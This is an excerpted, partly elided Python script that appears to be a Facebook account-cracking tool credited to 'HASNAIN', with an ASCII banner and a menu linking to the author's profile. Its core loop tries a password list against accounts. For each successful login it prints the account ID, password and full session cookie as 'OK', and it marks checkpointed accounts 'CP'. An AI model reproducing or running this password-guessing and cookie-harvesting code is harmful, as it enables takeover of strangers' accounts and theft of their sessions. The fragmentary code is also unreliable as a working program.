...
logo = """
         \033[1;37m`7MMF'              `7MMF'            db                      .M"""bgd.        `7MN.            `7MF'             db                     `7MMF'`7MN.            `7MF'
         \033[1;37m.  MM                    MM              ;MM:                 ,MI       "Y             MMN.           M              ;MM:                      MM      MMN.            M  
         \033[1;37m.  MM                    MM             ,V^MM.              `MMb.                  M    YMb      M            ,V^MM.                    MM      M.   YMb        M
         \033[1;37m   MMmmmmmmMM           ,M       `MM               `YMMNq.       M       `MN.   M          ,M      `MM                MM      M.       `MN.   M  
         \033[1;37m   MM                     MM         AbmmmqMA         .             `MM     M         `MM.M        AbmmmqMA             MM      M           `MM.M
         \033[1;37m   MM                     MM        A'                VML     Mb           dM      M             YMM.     A'                 VML         MM       M             YMM
         \033[1;37m JMML.               .JMML..AMA.            .AMMA.P"Ybmmd"       .JML.            YM   .AMA.           .AMMA.  .JMML. .JML.             YM 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mHASNAIN\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100085705304788&mibextid=ZbWKwL')
	elif gh =='0':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[HASNAIN-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[HASNAIN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mHASNAIN\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
